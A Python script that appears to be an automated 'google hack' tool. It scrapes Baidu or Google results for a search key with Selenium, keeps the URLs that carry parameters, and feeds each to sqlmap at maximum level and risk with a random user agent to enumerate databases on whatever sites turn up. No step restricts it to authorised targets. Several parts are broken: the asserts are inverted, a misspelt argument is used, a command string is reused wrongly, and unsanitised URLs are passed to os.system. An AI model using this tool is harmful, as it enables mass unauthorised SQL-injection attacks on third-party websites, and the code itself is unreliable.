from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import argparse
import requests_html
import json,os
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor

search_format = \
    {
    "baidu":"https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&wd={}&pn={}&tn=baidu",
    "google":"https://www.google.com/search?q={}&start={}"
    }

def get_real_website(urls:list,sleep = 3):
    driver = webdriver.Chrome()
    real_urls = []

    for url in urls:
        driver.get(url)
        time.sleep(sleep)
        real_urls.append(driver.current_url)

    return  real_urls

def process_for_sqlmap(urls):
    payload_urls = []
    for url in urls:
            raw_url = url.strip("\n").split("=")
            if len(raw_url) == 1:
                continue
            else:
                sub_url = ''
                for url_part in raw_url:
                    sub_url += url_part + "=*"

                payload_urls.append(url)

    return payload_urls

def get_raw_urls(search_type,search_key,numbers,delay = 3):
    driver = webdriver.Chrome()
    web = search_format[search_type]
    key = urlencode(search_key)
    webs = []
    for n in range(0, numbers, 10):
        driver.get(web.format(key,n))
        time.sleep(delay)
        urls = driver.find_elements(By.XPATH, '//*[@id="content_left"]//div//a[@target="_blank"]')
        for url in urls:
            one_url = url.get_attribute("href")
            webs.append(one_url)

    return webs

def output_data(res,output_file,show = False):
    with open(output_file,"w+") as fo:
        for res in res:
            if show:
                print(res)
            fo.write(res+"\n")

def check_search_engine():
    session = requests_html.HTMLSession()
    test_url ='https://www.google.com/webhp'
    response = session.get(test_url)
    code = response.status_code
    if str(code) != '200':
        return False
    else:
        return True

def check_sql_map(sqlmap_path):
    if os.path.exists(sqlmap_path):
        return True
    else:
        return False

def get_res_data(search_type,search_key,numbers,output_file,delay = 3,sqlmap = False,show = False):
    if search_type == "google":
        assert not check_search_engine(),"无法访问谷歌"
    raw_urls = get_raw_urls(search_type,search_key,numbers,delay = 3)
    real_urls = get_real_website(raw_urls,delay)
    if sqlmap:
        real_urls = process_for_sqlmap(real_urls)

    output_data(real_urls,output_file,show)
    return real_urls

def call_sqlmap(real_urls,sqlmap):
    cmd = 'python '+sqlmap+ '-u {} --level 5 --risk 3 --random-agent --delay 0.8 -dbs '
    for url in real_urls:
        cmd = cmd.format(url)
        os.system(cmd)
        
def main(args):
    if args.auto_use_sqlmap == True:
        assert not check_sql_map(args.sqlmap_path),"无法找到sqlmap"

    pool = ThreadPoolExecutor(max_workers=args.threads)
    for thread_count in range(args.threads):
        pool.submit(  get_res_data,
                      args.search_type,
                      args.search_key,
                      args.numbers,
                      args.output_file,
                      args.delay,
                      args.auto_use_sqlmap,
                      args.show
                    )
    if args.auto_use_sqlmap == True:
        urls = []
        with open(args.out_file,"r") as fi:
            for line in fi.readlines():
                urls.append(line.split("\n"))
        call_sqlmap(urls,args.sqlmap_path)


if __name__ == "__main__":

    arg = argparse.ArgumentParser(description="this is a auto_google_hack website get tools")
    arg.add_argument('--search_type',type=str,default="baidu")
    arg.add_argument('--search_key',type=str,)
    arg.add_argument('--numbers', type=int, default=10)
    arg.add_argument('--threads',type=int,default=5)
    arg.add_argument('--output_file',type=str,default="output.txt")
    arg.add_argument('--delay', type=int, default=3)
    arg.add_argument('--show',type = bool,default=False)
    arg.add_argument('--auto_use_sqlmap',type=bool,default=False)
    arg.add_argument('--sqlmap_path',type=str,default='./sqlmap')
    args = arg.parse_args()
    
    main(args)
   

